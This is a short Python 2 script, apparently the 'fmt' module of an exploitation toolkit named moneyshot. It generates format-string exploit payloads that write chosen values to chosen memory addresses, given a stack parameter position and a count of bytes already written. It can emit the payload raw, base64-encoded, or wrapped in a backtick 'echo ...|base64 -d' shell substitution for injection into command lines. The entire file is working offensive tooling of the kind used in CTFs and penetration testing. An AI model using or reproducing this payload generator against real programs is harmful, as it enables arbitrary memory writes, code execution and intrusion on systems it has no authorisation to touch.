#!/usr/bin/python

import sys
from lib.libformatstr import FormatStr

def main(args):
	if len(args) < 1:
		print "usage: moneyshot fmt <primitives>\n"
		print "availables primitives:"
		print "  * p:NNNN      - parameter position where user-controlled input starts"
		print "  * n:NNNN      - specify bytes already written (defaults to 0)"
		print "  * w:XXXX=YYYY - write value YYYY to address XXXX"
		print "  * o:format    - specify output format (base64, b64cmd, raw)\n"

		return

	valid_outformat = [ "base64", "b64cmd", "raw" ]

	out_format = "raw"

	p = FormatStr()

	param_pos = 0
	already_written = 0

	for param in args:
		if param[0:2] == "w:":
			(addr,vals) = param[2:].split("=")
			n=0
			for val in vals.split(","):
				p[ int(addr, 0)+(n*4) ] = int(val, 0)
				n = n+1

		elif param[0:2] == "p:":
			param_pos = int(param[2:], 0)
		elif param[0:2] == "n:":
			already_written = int(param[2:], 0)
		elif param[0:2] == "o:":
			out_format = param[2:]

			if out_format not in valid_outformat:
				print "UNKNOWN FMT outformat: '%s'" % (out_format)
				exit()
		else:
			print "UNKNOWN FMT specifier: '%s'" % (param)
			exit()

	fmt_str = p.payload(param_pos, start_len=already_written)

	if out_format == "raw":
		sys.stdout.write(fmt_str)
	elif out_format == "base64":
		sys.stdout.write(fmt_str.encode("base64"))
	elif out_format == "b64cmd":
		sys.stdout.write("`echo "+fmt_str.encode("base64").strip()+"|base64 -d`")

